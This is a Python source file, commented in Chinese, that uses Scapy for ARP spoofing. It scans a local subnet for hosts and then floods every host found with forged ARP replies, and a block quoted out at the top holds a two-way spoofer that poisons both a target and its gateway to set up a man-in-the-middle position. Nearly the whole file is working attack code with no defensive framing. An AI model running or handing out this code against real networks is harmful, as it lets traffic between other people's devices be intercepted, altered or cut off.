'''
from scapy.all import *

target_mac = arping("192.168.10.11")[0][0][1].hwsrc
getaway_mac = arping("192.168.10.1")[0][0][1].hwsrc


while True:
    arp_response = Ether(dst=target_mac)/ARP(op=2, pdst="192.168.10.4", hwdst=target_mac, psrc="192.168.10.1")
    sendp(arp_response)
    arp_response = Ether(dst=getaway_mac)/ARP(op=2, pdst="192.168.10.1", hwdst=getaway_mac, psrc="192.168.10.4")    
    sendp(arp_response)
'''

from scapy.all import *
import time



def scan_network(ip_range):
    # 构造 ARP 请求包
    arp_request = ARP(pdst=ip_range)
    # 构造以太网帧
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    # 将以太网帧和 ARP 请求包组合在一起
    packet = ether_frame / arp_request

    # 发送包并接收响应
    result = srp(packet, timeout=2, verbose=0)[0]

    # 解析响应结果
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

if __name__ == "__main__":
    # 定义要扫描的 IP 范围
    ip_range = "192.168.1.0/24"
    devices = scan_network(ip_range)

    # 打印扫描到的设备信息
    print("发现的设备:")
    for device in devices:
        print(f"IP 地址: {device['ip']}, MAC 地址: {device['mac']}")
    while True:
        for device in devices:
            target_mac = device['mac']
            target_ip = device['ip']
            arp_response = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.10.4")
            sendp(arp_response)
            print(f"发送 ARP 欺骗包给 {target_ip}，MAC 地址为 {target_mac}")
        time.sleep(0.5)        

'''
from scapy.all import *
while True:
    target_mac = arping("192.168.1.101")[0][0][1].hwsrc

'''